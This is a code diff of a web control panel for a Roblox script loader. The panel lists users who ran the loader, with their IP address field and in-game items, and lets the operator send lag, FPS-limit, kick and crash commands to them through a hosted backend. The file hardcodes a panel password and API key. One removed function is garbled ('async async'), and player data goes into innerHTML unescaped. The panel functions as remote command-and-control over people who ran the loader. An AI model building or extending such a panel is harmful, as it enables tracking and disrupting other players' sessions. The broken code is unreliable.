-        if (selectedUserId === userId) selectedUserId = null;
-        showToast('Player hidden', 'info');
+    btnKick.addEventListener('click', function() {
+        if (this.disabled) return;
+        if (!selectedUserId) { showToast('Select a player', '⚠️'); return; }
+        const player = players.get(selectedUserId);
+        if (!player || !player.online) { showToast('Player offline', '⚠️'); return; }
+        if (!confirm(`Kick ${player.username || 'player'}?`)) return;
+        sendCommand(selectedUserId, { kick: true }).then(() => showToast(`Kicked ${player.username}`, '🚪'));
+    });
+
+    btnCrash.addEventListener('click', function() {
+        if (this.disabled) return;
+        if (!selectedUserId) { showToast('Select a player', '⚠️'); return; }
+        const player = players.get(selectedUserId);
+        if (!player || !player.online) { showToast('Player offline', '⚠️'); return; }
+        if (!confirm(`Crash ${player.username || 'player'}?`)) return;
+        sendCommand(selectedUserId, { crash: true }).then(() => showToast(`Crash sent to ${player.username}`, '💥'));
+    });
+
+    let pollCount = 0;
+
+    async function poll() {
+        const data = await fetchPlayers();
+        const newMap = new Map();
+        for (const p of data) {
+            const online = (Date.now() - (p.lastHeartbeat || 0)) < 15000;
+            p.online = online;
+            if (players.has(p.user_id)) {
+                const old = players.get(p.user_id);
+                p._cmdState = old._cmdState || {};
+            } else {
+                p._cmdState = { fps_limit: false, lag_n: false, lag_c: false };
+            }
+            newMap.set(p.user_id, p);
+        }
+        players = newMap;
+        if (selectedUserId && !players.has(selectedUserId)) {
+            selectedUserId = null;
+        }
         renderPlayers();
-        updateCounts();
+        updateCommandPanel();
+        const now = new Date();
+        lastUpdate.textContent = 'updated ' + now.toLocaleTimeString();
+        refreshTimer.textContent = (pollCount + 1) + 's';
+        pollCount = (pollCount + 1) % 999;
     }
-}
 
-function restorePlayer(userId) {
-    const player = hiddenPlayers.get(userId);
-    if (player) {
-        players.set(userId, { ...player, online: false, lastHeartbeat: Date.now() - 30000 });
-        hiddenPlayers.delete(userId);
-        showToast('Player restored', 'success');
+    searchInput.addEventListener('input', function() {
+        searchQuery = this.value;
         renderPlayers();
-        updateCounts();
-    }
-}
+    });
 
-function updateCounts() {
-    document.getElementById('activeCount').textContent = '(' + Array.from(players.values()).filter(p => p.online).length + ')';
-    document.getElementById('pastCount').textContent = '(' + pastPlayers.size + ')';
-    document.getElementById('hiddenCount').textContent = '(' + hiddenPlayers.size + ')';
-    document.getElementById('onlineCount').textContent = Array.from(players.values()).filter(p => p.online).length;
-}
+    poll();
+    setInterval(poll, POLL_INTERVAL);
+    document.addEventListener('visibilitychange', () => { if (!document.hidden) poll(); });
 
-function renderPlayers() {
-    const list = getDisplayList();
-    const container = document.getElementById('playerList');
-    updateCounts();
-    if (list.length === 0) {
-        container.innerHTML = `<div class="empty-state"><div class="icon">📡</div><h3>${currentTab === 'active' ? 'Waiting for clients...' : 'No players found'}</h3><p>${currentTab === 'active' ? 'Execute the loader script in Roblox to see players appear.' : 'No players in this category.'}</p></div>`;
-        return;
-    }
-    let html = '';
-    for (const p of list) {
-        const isOnline = p.online;
-        const initial = (p.username || '?')[0].toUpperCase();
-        const avatarHtml = p.avatar_url ? `<img src="${p.avatar_url}" alt="${p.username}" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">` : '';
-        const fallbackStyle = p.avatar_url ? 'display:none' : '';
-        let brainrotsHtml = '';
-        if (p.brainrots && p.brainrots.length > 0) {
-            const brainrotItems = p.brainrots.map(b => `<div class="brainrot-item"><span class="title">${b.title || 'Unknown'}</span><span class="cash">${formatCash(b.cash)}</span></div>`).join('');
-            brainrotsHtml = `<div class="brainrots-header"><h4>🧠 BRAINROTS</h4><span class="count">${p.brainrots.length} items</span></div><div class="brainrot-list">${brainrotItems}</div>`;
-        } else {
-            brainrotsHtml = `<div class="brainrots-header"><h4>🧠 BRAINROTS</h4><span class="count">0 items</span></div><div class="brainrot-empty">No brainrots found</div>`;
+    setTimeout(() => {
+        if (!selectedUserId) {
+            const first = Array.from(players.values()).find(p => p.online);
+            if (first) selectPlayer(first.user_id);
         }
-        let serverPlayersHtml = '';
-        if (p.server_players && p.server_players.length > 0) {
-            serverPlayersHtml = `<div style="margin-bottom: 14px;"><div style="font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 6px;">Server players (${p.server_players.length})</div><div class="server-players">${p.server_players.map(sp => `<span class="server-player-tag">${sp}</span>`).join('')}</div></div>`;
-        }
-        const state = commandStates.get(p.user_id) || { fps_limit: false, lag_n: false, lag_c: false };
-        html += `<div class="player-card ${isOnline ? '' : 'offline'}">
-            <div class="player-card-header">
-                <div class="player-avatar">${avatarHtml}<div class="fallback" style="${fallbackStyle}">${initial}</div><div class="status-indicator ${isOnline ? 'online' : 'offline'}"></div></div>
-                <div class="player-info">
-                    <div class="player-name">${p.username || 'Unknown'}<span class="handle">@${p.username || 'unknown'}</span><span class="id">${p.user_id || '?'}</span></div>
-                    <div class="player-meta">
-                        <span class="tag">${p.game_name || 'Unknown Game'}</span>
-                        <span class="tag">${p.executor || 'unknown'}</span>
-                        <span class="tag">${isOnline ? 'Delta · ' + (p.server_players ? p.server_players.length : 0) + ' in server' : 'last seen ' + formatTimeAgo(p.lastHeartbeat)}</span>
-                    </div>
-                </div>
-                <div class="player-status-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</div>
-            </div>
-            <div class="player-details">
-                <div class="detail-item"><span class="label">Place ID</span><span class="value id">${p.place_id || '—'}</span></div>
-                <div class="detail-item"><span class="label">Job ID</span><span class="value id muted">${p.job_id || '—'}</span></div>
-                <div class="detail-item"><span class="label">IP Address</span><span class="value">${p.ip_address || '—'}</span></div>
-                <div class="detail-item"><span class="label">Executor</span><span class="value">${p.executor || '—'}</span></div>
-            </div>
-            ${serverPlayersHtml}
-            <div class="brainrot-section">${brainrotsHtml}</div>
-            <div class="action-buttons">
-                <button class="action-btn fps" onclick="toggleFps('${p.user_id}')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
-                    ${state.fps_limit ? 'Resume FPS' : 'Stop FPS'}
-                </button>
-                <button class="action-btn lag" onclick="toggleLagN('${p.user_id}')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
-                    ${state.lag_n ? 'Stop Lag N' : 'Lag N'}
-                </button>
-                <button class="action-btn lag" onclick="toggleLagC('${p.user_id}')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
-                    ${state.lag_c ? 'Stop Lag C' : 'Lag C'}
-                </button>
-                <button class="action-btn kick" onclick="kickPlayer('${p.user_id}')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                    Kick
-                </button>
-                <button class="action-btn crash" onclick="crashPlayer('${p.user_id}')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.205 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>
-                    Crash
-                </button>
-                <button class="action-btn hide" onclick="hidePlayer('${p.user_id}', event)">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/></svg>
-                    Hide
-                </button>
-            </div>
-        </div>`;
-    }
-    container.innerHTML = html;
-}
-
-function toggleDetails(userId) {
-    if (selectedUserId === userId) { selectedUserId = null; }
-    else { selectedUserId = userId; }
-    renderPlayers();
-}
-
-async function toggleFps(userId) {
-    const state = commandStates.get(userId);
-    if (!state) return;
-    state.fps_limit = !state.fps_limit;
-    await sendCommand(userId, { fps_limit: state.fps_limit });
-    showToast(`FPS Limit ${state.fps_limit ? 'ON' : 'OFF'}`, 'success');
-    addChatMsg('system', `FPS Limit ${state.fps_limit ? 'ON' : 'OFF'} -> ${players.get(userId)?.username || 'player'}`);
-    renderPlayers();
-}
-
-async function toggleLagC(userId) {
-    const state = commandStates.get(userId);
-    if (!state) return;
-    state.lag_c = !state.lag_c;
-    if (state.lag_c) state.lag_n = false;
-    await sendCommand(userId, { lag_c: state.lag_c, lag_n: state.lag_n });
-    showToast(`Lag C ${state.lag_c ? 'ON' : 'OFF'}`, 'success');
-    addChatMsg('system', `Lag C ${state.lag_c ? 'ON' : 'OFF'} -> ${players.get(userId)?.username || 'player'}`);
-    renderPlayers();
-}
-
-async function toggleLagN(userId) {
-    console.log('[PANEL] toggleLagN clicked for', userId);
-    const state = commandStates.get(userId);
-    if (!state) { console.log('[PANEL] No state found for', userId); return; }
-    state.lag_n = !state.lag_n;
-    if (state.lag_n) state.lag_c = false;
-    console.log('[PANEL] New lag_n state:', state.lag_n);
-    await sendCommand(userId, { lag_n: state.lag_n, lag_c: state.lag_c });
-    showToast(`Lag N ${state.lag_n ? 'ON' : 'OFF'}`, 'success');
-    addChatMsg('system', `Lag N ${state.lag_n ? 'ON' : 'OFF'} -> ${players.get(userId)?.username || 'player'}`);
-    renderPlayers();
-}
-
-async function kickPlayer(userId) {
-    const player = players.get(userId);
-    if (!player) return;
-    if (!confirm(`Kick ${player.username || 'player'}?`)) return;
-    await sendCommand(userId, { kick: true });
-    showToast(`Kicked ${player.username}`, 'success');
-    addChatMsg('system', `Kick -> ${player.username} (${userId})`);
-    player.online = false;
-    pastPlayers.set(userId, player);
-    players.delete(userId);
-    if (selectedUserId === userId) selectedUserId = null;
-    renderPlayers();
-    updateCounts();
-}
-
-async function crashPlayer(userId) {
-    const player = players.get(userId);
-    if (!player) return;
-    if (!confirm(`Crash ${player.username || 'player'}?`)) return;
-    await sendCommand(userId, { crash: true });
-    showToast(`Crash sent to ${player.username}`, 'success');
-    addChatMsg('system', `Crash -> ${player.username} (${userId})`);
-}
-
-function clearPastPlayers() {
-    pastPlayers.clear();
-    showToast('Past players cleared', 'info');
-    renderPlayers();
-    updateCounts();
-}
-
-function downloadData() {
-    const data = { active: Array.from(players.values()), past: Array.from(pastPlayers.values()), hidden: Array.from(hiddenPlayers.values()), exportedAt: new Date().toISOString() };
-    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'panel-data-' + Date.now() + '.json';
-    a.click();
-    URL.revokeObjectURL(url);
-    showToast('Data downloaded', 'success');
-}
-
-function showBrainrotFilter() { showToast('Brainrot filter coming soon', 'info'); }
-
-function addChatMsg(sender, text) {
-    const container = document.getElementById('chatMessages');
-    const div = document.createElement('div');
-    div.className = 'chat-msg';
-    div.innerHTML = `<span class="${sender === 'system' ? 'system' : 'sender'}">${sender}</span> ${text}`;
-    container.appendChild(div);
-    container.scrollTop = container.scrollHeight;
-    document.getElementById('chatCount').textContent = container.children.length;
-}
-
-async function fetchPlayers() {
-    if (!panelUrl) return [];
-    try {
-        console.log('[PANEL] Fetching players from:', panelUrl + '/api/players');
-        const res = await fetch(panelUrl + '/api/players');
-        console.log('[PANEL] Players response status:', res.status);
-        if (!res.ok) throw new Error('Server error');
-        const data = await res.json();
-        console.log('[PANEL] Players received:', data.players ? data.players.length : 0);
-        return data.players || [];
-    } catch (e) { 
-        console.error('[PANEL] Fetch players error:', e);
-        return []; 
-    }
-}
-
-async async function sendCommand(userId, payload) {
-    console.log('[PANEL] Sending command to server:', userId, payload);
-    if (!panelUrl) { showToast('Configure panel URL first', 'error'); return null; }
-    try {
-        const res = await fetch(panelUrl + '/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user_id: userId, ...payload })
-        });
-        console.log('[PANEL] Server response status:', res.status);
-        if (!res.ok) {
-            const errText = await res.text();
-            console.error('[PANEL] Server error:', errText);
-            throw new Error('Command failed: ' + res.status);
-        }
-        const data = await res.json();
-        console.log('[PANEL] Server response:', data);
-        return data;
-    } catch (e) {
-        console.error('[PANEL] Command error:', e);
-        showToast('Command failed: ' + e.message, 'error');
-        return null;
-    }
-}
-
-async function pollPlayers() {
-    const data = await fetchPlayers();
-    const newPlayers = new Map();
-    const newPast = new Map();
-    for (const p of data) {
-        p.online = (Date.now() - (p.lastHeartbeat || 0)) < 20000;
-        if (p.online) {
-            newPlayers.set(p.user_id, p);
-        } else {
-            newPast.set(p.user_id, p);
-        }
-        if (!commandStates.has(p.user_id)) {
-            commandStates.set(p.user_id, { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false });
-        }
-    }
-    players = newPlayers;
-    pastPlayers = newPast;
-    if (selectedUserId && !players.has(selectedUserId) && !pastPlayers.has(selectedUserId)) {
-        selectedUserId = null;
-    }
-    renderPlayers();
-}
-
-function startPolling() {
-    if (pollInterval) clearInterval(pollInterval);
-    pollPlayers();
-    pollInterval = setInterval(pollPlayers, 2000);
-}
-
-function loadDemoData() {
-    const demoPlayers = [
-        {
-            user_id: '10678482300',
-            username: 'Tj3838282',
-            display_name: 'Tj3838282',
-            avatar_url: '',
-            place_id: '99606176102979',
-            game_name: 'Steal a Brainrot [Duel Server]',
-            job_id: '9f94e98b-4f92-4864-ba2a-b833be0dca1d',
-            executor: 'Delta',
-            server_players: ['Tj3838282', 'ion_Foara'],
-            ip_address: '',
-            brainrots: [
-                { title: 'Los Combinasionas', cash: '150M/s' },
-                { title: 'Nuclearo Dinosauro', cash: '97.5M/s' },
-                { title: 'Nuclearo Dinosauro', cash: '67.5M/s' },
-                { title: 'Spaghetti Tualetti', cash: '720M/s' },
-                { title: 'Pot Pumpkin', cash: '22.5M/s' },
-            ],
-            lastHeartbeat: Date.now() - 300000,
-            online: false,
-        },
-        {
-            user_id: '4843782041',
-            username: 'Midnight',
-            display_name: 'Midnight',
-            avatar_url: '',
-            place_id: '99606176102979',
-            game_name: 'Steal a Brainrot',
-            job_id: 'delta-1',
-            executor: 'Delta',
-            server_players: ['Midnight'],
-            ip_address: '',
-            brainrots: [],
-            lastHeartbeat: Date.now() - 600000,
-            online: false,
-        },
-    ];
-    for (const p of demoPlayers) {
-        pastPlayers.set(p.user_id, p);
-        commandStates.set(p.user_id, { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false });
-    }
-    renderPlayers();
-    updateCounts();
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-    loadDemoData();
-    document.getElementById('loaderCodeBlock').textContent = 'Execute this with any executor to appear in the panel.\n\n1. Enter your backend URL and API Key above\n2. Click Update\n3. Copy the loader and execute it in Roblox\n4. Players will appear automatically';
-});
-
-document.getElementById('loaderModal').addEventListener('click', (e) => {
-    if (e.target === document.getElementById('loaderModal')) closeLoaderModal();
-});
-
-
-// LOGIN OVERLAY
-const PANEL_PASSWORD = 'aggredireontopstupidnga';
-const DEFAULT_PANEL_URL = 'https://roblox-panel-4h3i.onrender.com';
-const DEFAULT_API_KEY = 'aggredireontopstupidnga';
-
-function doLogin() {
-    var input = document.getElementById('loginPassword').value;
-    var errorEl = document.getElementById('loginError');
-    var screen = document.getElementById('loginScreen');
-
-    if (input === PANEL_PASSWORD) {
-        screen.style.display = 'none';
-        errorEl.style.display = 'none';
-
-        var urlInput = document.getElementById('panelUrl');
-        var keyInput = document.getElementById('apiKey');
-        if (urlInput) urlInput.value = DEFAULT_PANEL_URL;
-        if (keyInput) keyInput.value = DEFAULT_API_KEY;
-
-        if (typeof updateLoader === 'function') {
-            try { updateLoader(); } catch(e) {}
-        }
-    } else {
-        errorEl.classList.add('show');
-        errorEl.style.display = 'block';
-        document.getElementById('loginPassword').value = '';
-        document.getElementById('loginPassword').focus();
-    }
-}
+    }, 2000);
 </script>
 
 </body>
